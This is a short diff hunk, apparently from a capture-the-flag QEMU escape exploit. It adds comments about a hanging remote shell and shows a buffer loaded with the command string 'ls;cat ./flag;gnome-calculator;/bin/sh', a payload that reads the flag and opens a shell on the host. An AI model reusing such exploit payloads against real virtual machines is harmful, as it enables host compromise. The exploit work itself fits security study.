@@ -323,6 +323,8 @@ void qemuEscape(void)
      *      # sh: turning off NDELAY mode
      * But for some other qemu pwns, it comes the same message 
      * with correct works. So I think the problem is not here, but where?
+     * For the remote attacking, the problem seems not to be existed, 
+     * but the shell will be hang for a while before it starts working...
      */
     buf[33] = buf[34] = 0;
     strcpy((char*)&buf[33], "ls;cat ./flag;gnome-calculator;/bin/sh");
